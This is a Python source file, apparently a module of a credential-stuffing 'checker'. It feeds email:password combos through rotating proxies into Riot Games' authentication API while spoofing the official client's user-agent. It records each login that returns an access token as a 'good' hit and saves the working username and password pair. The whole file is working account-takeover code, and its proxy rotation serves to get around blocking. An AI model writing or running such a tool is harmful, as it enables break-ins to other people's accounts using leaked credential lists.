from modules.variables import Checker
from requests import Session
from modules.functions import bad_proxy, log,save,set_proxy

def check(email:str,password:str):
    username = email.split("@")[0] if "@" in email else email
    retries = 0
    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)

        headers = {
            "Host": "auth.riotgames.com" ,
            "user-agent": "RiotClient/30.0.1.3715678.3712489 rso-auth (Windows;10;;Professional, x64)" ,
            "Cache-Control": "no-cache" ,
            "Accept": "application/json" ,
            "Accept-Encoding": "gzip, deflate" 
        }
        data_1 = {"acr_values":"urn:riot:bronze","claims":"","client_id":"riot-client","nonce":"ih0ckcv8kNAghtFLBfyAwQ","redirect_uri":"http://localhost/redirect","response_type":"token id_token","scope":"openid link ban lol_region"}
        data_2 = {"language":"en_US","password":password,"region":None,"remember":False,"type":"auth","username":username}
        try:
            with Session() as s:
                s.post("https://auth.riotgames.com/api/v1/authorization",headers=headers,json=data_1,proxies=proxy_set,timeout=Checker.timeout)
                response = s.put("https://auth.riotgames.com/api/v1/authorization",headers=headers,json=data_2,proxies=proxy_set,timeout=Checker.timeout).text
                if "auth_failure" in response:
                    retries += 1
                elif "access_token" in response:
                    if not Checker.cui:
                        log("good",username+":"+password,"Riot")
                    save("Riot","good",Checker.time,username+":"+password+f" | Original Combo: {email}:{password}")
                    Checker.good += 1
                    Checker.cpm += 1
                    return
                else:
                    raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1
    Checker.cpm += 1
    return